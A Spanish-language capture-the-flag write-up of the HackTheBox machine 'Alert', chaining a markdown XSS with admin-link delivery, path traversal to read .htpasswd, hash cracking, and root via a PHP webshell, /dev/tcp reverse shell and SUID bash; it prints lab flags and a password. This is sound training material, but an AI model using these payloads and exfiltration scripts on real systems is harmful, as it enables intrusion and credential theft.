---
tags:
title: Alert - Easy (HTB)
permalink: /Alert-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---

---


`Ip : 10.10.11.44`
# HackTheBox | Alert

# Nmap Results

```bash 
nmap -sCV -p22,80 10.10.11.44                       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-18 11:12 EDT
Nmap scan report for alert.htb (10.10.11.44)
Host is up (0.27s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-title: Alert - Markdown Viewer
|_Requested resource was index.php?page=alert
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.19 seconds
```

_Podemos ver la dirección HTTP a environment.htb en tcp/80, que debemos añadir a nuestro archivo /etc/hosts._

```bash 
echo -e '10.10.11.44\t\alert.htb' | sudo tee -a /etc/hosts
```

# Service Enumeration

## TCP 80

![Untitled 3 1](images/Untitled 3 1.jpg)

Al parecer la pagina tiene una seccion de subida de archivos `markdown`(`.md`)

#### Gobuster Enumeration

```bash 
gobuster dir -u http://alert.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 200 -x php                       
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://alert.htb
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 308] [--> http://alert.htb/uploads/]
/css                  (Status: 301) [Size: 304] [--> http://alert.htb/css/]
/index.php            (Status: 302) [Size: 660] [--> index.php?page=alert]
/messages             (Status: 301) [Size: 309] [--> http://alert.htb/messages/]
/messages.php         (Status: 200) [Size: 1]
```

Vemos directorio de los cuales no tenemos acceso desde nuestro lado, pero si vemos bien en unas de las rutas se recibe el parametro `alert` asi que probamos fuzzeando por otros parametros para ver si encontramos mas informacion.

```bash 
gobuster fuzz -u 'http://alert.htb/index.php?page=FUZZ' -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -o alert-fuzz.txt --exclude-length 301,690
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://alert.htb/index.php?page=FUZZ
[+] Method:           GET
[+] Threads:          50
[+] Wordlist:         /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Exclude Length:   301,690
[+] User Agent:       gobuster/3.8
[+] Timeout:          10s
===============================================================
Starting gobuster in fuzzing mode
===============================================================
[Status=200] [Length=1046] [Word=about] http://alert.htb/index.php?page=about
[Status=200] [Length=966] [Word=alert] http://alert.htb/index.php?page=alert
[Status=200] [Length=1000] [Word=contact] http://alert.htb/index.php?page=contact
[Status=200] [Length=1116] [Word=donate] http://alert.htb/index.php?page=donate
[Status=200] [Length=661] [Word=messages] http://alert.htb/index.php?page=messages
```

Sin exito visitando esos enlaces no encontramos nada.
Buscando por alguno tipo de vulnerabilidad con archivos de este tipo encontramos esta [pagina](https://github.com/showdownjs/showdown/wiki/Markdown%27s-XSS-Vulnerability-(and-how-to-mitigate-it)). En la cual vemos que podemos depositar codigo `JavaScript` el cual puede desencadenar en un `XSS (Cross Site Scripting)`, vamos a hacer una prueba con un archivo `test.md` con el siguiente contenido:

```javascript
<script>alert('xss');</script>
```

Y lo subimos a la Web.

![Pasted image 20250919212918](images/Pasted image 20250919212918.png)

Y vemos que efectivamente si hay un `XSS` en la pagina, asi q pasamos a crear uno que nos exfiltre la informacion desde el lado de la victima, pero primero probamos si nos llega la peticion

```javascript 
<script>
fetch("http://alert.htb")
.then(resp => resp.text())
.then(body => {{
    fetch("http://10.10.16.4/exfil");
}})
</script>
```

Subimos el archivo y montamos un servidor en `Python`.

```bash 
python3 -m http.server 80                                                       
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.16.4 - - [19/Sep/2025 21:34:51] code 404, message File not found
10.10.16.4 - - [19/Sep/2025 21:34:51] "GET /exfil HTTP/1.1" 404 -
```

Y vemos que efectivamente si nos llega la peticion pero desde nuestro servidor, asi que buscando por mas inyecciones o maneras de que el servidor sea quien nos envia la peticion, detecto que en la seccion de `Contact Us` poniendo un enlace por ejemplo el nuestro pasa lo siguiente.

![Pasted image 20250919221649](images/Pasted image 20250919221649.png)

```bash 
python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.44 - - [19/Sep/2025 22:18:04] code 404, message File not found
10.10.11.44 - - [19/Sep/2025 22:18:04] "GET /test HTTP/1.1" 404 -
```

Y ahora si vemos que la peticion se hace desde el servidor victima hacia nosotros

`SPOILER` (Probe anteriormente por un robo de cookies del usuario detras de las peticiones pero no tuve exito), por lo que pasamos a un codigo q nos exfiltre la informacion del lado del usuario victima, por lo que hacemos que nos exfiltra el contenido de la url `http://alert.htb/index.php?page=messages`

Preparamos nuestro servidor 

```bash 
python3 -m http.server 80
```

Y como al subir el archivo hay un link que nos provee un enlace para compartir podemos usarlos, para proveerlo a la victima en la seccion anteriormente mencionada.

Y vemos que del lado del servidor logramos exfiltrar la data 
```bash
python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 
10.10.11.44 - - [19/Sep/2025 22:20:13] "GET /exfil?body=PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9zdHlsZS5jc3MiPgogICAgPHRpdGxlPkFsZXJ0IC0gTWFya2Rvd24gVmlld2VyPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxuYXY+CiAgICAgICAgPGEgaHJlZj0iaW5kZXgucGhwP3BhZ2U9YWxlcnQiPk1hcmtkb3duIFZpZXdlcjwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1jb250YWN0Ij5Db250YWN0IFVzPC9hPgogICAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWFib3V0Ij5BYm91dCBVczwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1kb25hdGUiPkRvbmF0ZTwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1tZXNzYWdlcyI+TWVzc2FnZXM8L2E+ICAgIDwvbmF2PgogICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8aDE+TWVzc2FnZXM8L2gxPjx1bD48bGk+PGEgaHJlZj0nbWVzc2FnZXMucGhwP2ZpbGU9MjAyNC0wMy0xMF8xNS00OC0zNC50eHQnPjIwMjQtMDMtMTBfMTUtNDgtMzQudHh0PC9hPjwvbGk+PC91bD4KICAgIDwvZGl2PgogICAgPGZvb3Rlcj4KICAgICAgICA8cCBzdHlsZT0iY29sb3I6IGJsYWNrOyI+qSAyMDI0IEFsZXJ0LiBBbGwgcmlnaHRzIHJlc2VydmVkLjwvcD4KICAgIDwvZm9vdGVyPgo8L2JvZHk+CjwvaHRtbD4KCg== HTTP/1.1" 404 -
```

Decodificamos la data 

```bash 
echo PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9zdHlsZS5jc3MiPgogICAgPHRpdGxlPkFsZXJ0IC0gTWFya2Rvd24gVmlld2VyPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxuYXY+CiAgICAgICAgPGEgaHJlZj0iaW5kZXgucGhwP3BhZ2U9YWxlcnQiPk1hcmtkb3duIFZpZXdlcjwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1jb250YWN0Ij5Db250YWN0IFVzPC9hPgogICAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWFib3V0Ij5BYm91dCBVczwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1kb25hdGUiPkRvbmF0ZTwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1tZXNzYWdlcyI+TWVzc2FnZXM8L2E+ICAgIDwvbmF2PgogICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8aDE+TWVzc2FnZXM8L2gxPjx1bD48bGk+PGEgaHJlZj0nbWVzc2FnZXMucGhwP2ZpbGU9MjAyNC0wMy0xMF8xNS00OC0zNC50eHQnPjIwMjQtMDMtMTBfMTUtNDgtMzQudHh0PC9hPjwvbGk+PC91bD4KICAgIDwvZGl2PgogICAgPGZvb3Rlcj4KICAgICAgICA8cCBzdHlsZT0iY29sb3I6IGJsYWNrOyI+qSAyMDI0IEFsZXJ0LiBBbGwgcmlnaHRzIHJlc2VydmVkLjwvcD4KICAgIDwvZm9vdGVyPgo8L2JvZHk+CjwvaHRtbD4KCg== | base64 -d
```

Lo que nos da como resultado esto:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <title>Alert - Markdown Viewer</title>
</head>
<body>
    <nav>
        <a href="index.php?page=alert">Markdown Viewer</a>
        <a href="index.php?page=contact">Contact Us</a>
        <a href="index.php?page=about">About Us</a>
        <a href="index.php?page=donate">Donate</a>
        <a href="index.php?page=messages">Messages</a>    </nav>
    <div class="container">
        <h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li></ul>
    </div>
    <footer>
        <p style="color: black;">� 2024 Alert. All rights reserved.</p>
    </footer>
</body>
</html>
```

## Automatización del proceso
Al parecer la victima tiene de su lado del sevidor una seccion de mensajes, en la cual parece haber un archivo `.txt`, podemos intentar leer el contenido repitiendo el mismo paso, pero para ahorrarnos el tener que modificar el archivo a cada rato creamos un `script` en python que nos lo automatize cada paso.

```python
import re
import requests
import sys
import socket
import threading

if len(sys.argv) < 2:
    print(f"usage: {sys.argv[0]} <target url> [listener ip]")
    sys.exit()

target = sys.argv[1] if sys.argv[1].startswith('http') else f'http://alert.htb/messages.php?file=../../../../{sys.argv[1]}'
ip = sys.argv[2] if len(sys.argv) > 2 else '10.10.16.4'

# Función del listener
def listener():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("0.0.0.0", 80))
        sock.listen(5)
        print("[+] Listening on port 80...")
        conn, addr = sock.accept()
        with conn:
            req = b""
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                req += chunk
            # Intentamos separar el body del request HTTP
            parts = req.decode("utf-8", errors="ignore").split("\r\n\r\n", 1)
            if len(parts) > 1:
                body = parts[1]
            else:
                body = ""
            print(f"[+] Received exfiltrated data:\n{body}")

# Levantamos el listener en un hilo
thread = threading.Thread(target=listener, daemon=True)
thread.start()

# Generamos el payload JS con POST
markdown = f"""
<script>
fetch("{target}")
.then(resp => resp.text())
.then(body => {{
    fetch("http://{ip}/exfil", {{ method: "POST", body: body}});
}})
</script>
"""

# Subimos el payload
files = {"file": ("payload.md", markdown)}
response = requests.post("http://alert.htb/visualizer.php", files=files)

# Obtenemos el link compartido
m = re.search(r"http://alert\.htb/visualizer\.php\?link_share=.*\.md", response.text)
if not m:
    print("error: share link not in page")
    sys.exit()
share_link = m.group()

# Enviamos el link al admin
print(f"[+] Share link: {share_link}")
data = {"email": "test@example.com", "message": f"Check this link: {share_link}"}
response = requests.post("http://alert.htb/contact.php", data=data)

if "Message sent successfully!" not in response.text:
    print("error: Message not sent")
    sys.exit()

# Esperamos a que el listener reciba datos
thread.join()
```

Lo corremos apuntando a esa direccion:

```bash 
python3 test.py http://alert.htb/messages.php?file=2024-03-10_15-48-34.txt
[+] Listening on port 80...
[+] Share link: http://alert.htb/visualizer.php?link_share=68ce02a8cea333.72731225.md
[+] Received exfiltrated data:
<pre></pre>
```

Pero al parecer el contenido del archivo no lo logramos leer. Como anteriormente vi mediante `wappalizer` que corre un servidor `apache`, podemos intentar leer ruta predetermindas de este servicio como por ejemplo, `/etc/apache2/sites-enabled` donde su archivo por defecto lleva el nombre de `000-default.conf`.

```bash 
python3 make.py /etc/apache2/sites-enabled/000-default.conf
[+] Listening on port 80...
[+] Share link: http://alert.htb/visualizer.php?link_share=68cc4a2b02e560.65329959.md
[+] Received exfiltrated data:
<pre><VirtualHost *:80>
    ServerName alert.htb

    DocumentRoot /var/www/alert.htb

    <Directory /var/www/alert.htb>
        Options FollowSymLinks MultiViews
        AllowOverride All
    </Directory>

    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^alert\.htb$
    RewriteCond %{HTTP_HOST} !^$
    RewriteRule ^/?(.*)$ http://alert.htb/$1 [R=301,L]

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

<VirtualHost *:80>
    ServerName statistics.alert.htb

    DocumentRoot /var/www/statistics.alert.htb

    <Directory /var/www/statistics.alert.htb>
        Options FollowSymLinks MultiViews
        AllowOverride All
    </Directory>

    <Directory /var/www/statistics.alert.htb>
        Options Indexes FollowSymLinks MultiViews
        AllowOverride All
        AuthType Basic
        AuthName "Restricted Area"
        AuthUserFile /var/www/statistics.alert.htb/.htpasswd
        Require valid-user
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

</pre>
```

Vemos una archivo del sistema el cual reside en la ruta de un nuevo subdominio de la maquina, asi que leemos el archivo para ver su contenido.

```bash 
echo -e '10.10.11.44\t\'statistics.alert.htb' | sudo tee -a /etc/hosts
```

```bash 
python3 make.py /var/www/statistics.alert.htb/.htpasswd           
[+] Listening on port 80...
[+] Share link: http://alert.htb/visualizer.php?link_share=68cc4a40d352a0.08323827.md
[+] Received exfiltrated data:
<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
</pre>
```

Vemos que conseguimos unas credenciales para el usuario `albert` con su hash, por lo que lo guardamos en un archivo y lo crackeamos con `hashcat`.


```bash 
echo -e '$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/' > hash
```

```bash 
hashcat -m 1600 -a 0 hash /usr/share/wordlists/rockyou.txt


$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited
```

Obtenemos su password, por lo que pasamos a loguearnos por `SSH`.

```bash 
ssh albert@alert.htb                                  
The authenticity of host 'alert.htb (10.10.11.44)' can't be established.
ED25519 key fingerprint is SHA256:p09n9xG9WD+h2tXiZ8yi4bbPrvHxCCOpBLSw0o76zOs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'alert.htb' (ED25519) to the list of known hosts.
albert@alert.htb's password: 

albert@alert:~$ whoami
albert
```

# Post-Exploit Enumeration

## Entorno de operacion 

#### OS & Kernel

```bash 
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal

Linux alert 5.4.0-200-generic #220-Ubuntu SMP Fri Sep 27 13:19:16 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux 

```

#### Usuario actual 

```bash 
id
uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)
```

Vemos que formamos parte del grupo `management`por lo que buscamos por archivos en los cuales tengamos permisos especiales.

```bash 
find / -group management 2>/dev/null 
/opt/website-monitor/config
/opt/website-monitor/config/configuration.php
```

```bash 
cat /opt/website-monitor/config/configuration.php
<?php
define('PATH', '/opt/website-monitor');
?>
```
# Privilege Escalation
## Website Monitor

Vemos que dentro del directorio `/opt/website-monitor/` tenemos privilegios maximos, y ademas que hay un proceso corriendo como root.

```bash 
ps -faux | grep root 
root        1003  0.0  0.6 206768 24380 ?        Ss   00:28   0:00 /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor
```

Vemos que corre el servicio que corre por que el puerto `8080` con `php` y ademas todo lo que esta dentro de ese mismo directorio, vamos a hacer un por forwarding del puerto `8080` para ver que es lo que corre en ese puerto 

```bash 
ssh albert@10.10.11.44 -L 8888:127.0.0.1:8080
```

![Pasted image 20250919233614](images/Pasted image 20250919233614.png)

Al parecer es una web la que se corre por el puerto `8080`, ya apartir de aca hay muchas formas de escalar a `root`, una es colocando una webshell en el directorio de la pagina esta, otra es directamente colocando un php malicioso en la ruta, o tambien modificando el que ya estaba.

Probemos ambas.

Primero creamos un `php`malicioso en la ruta para crear la webshell.

```php
echo '<?php system($_GET['cmd']);?>' > test.php
```

![{E6317AEB-CAF6-4D56-A5AD-78190DC46EA1}](images/{E6317AEB-CAF6-4D56-A5AD-78190DC46EA1}.png)

Enviamos la reverse shell 

```bash 
bash -c 'bash -i >& /dev/tcp/10.10.16.4/4444 0>&1'
```

```bash 
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.11.44] 43452
whoami
root
```

 O modoficando el `configuration.php` que habiamos visto antes 

Primero chequeamos la bash 

```bash 
ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Y ahora lo modificamos

```bash 
echo '<?php system("chmod u+s /bin/bash");?>' > configuration.php
```

```bash 
ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Nos convertimos nuestra `bash` a la de `root`

```bash 
/bin/bash -p
```

```bash 
bash -p
bash-5.0# whoami
root
```

# Flags

#### User
`edce17cb115e65350deb89144567aa99`

#### Root
`8a1d9cd33bd160db1da369442de4c1df`

`~Happy Hacking.`






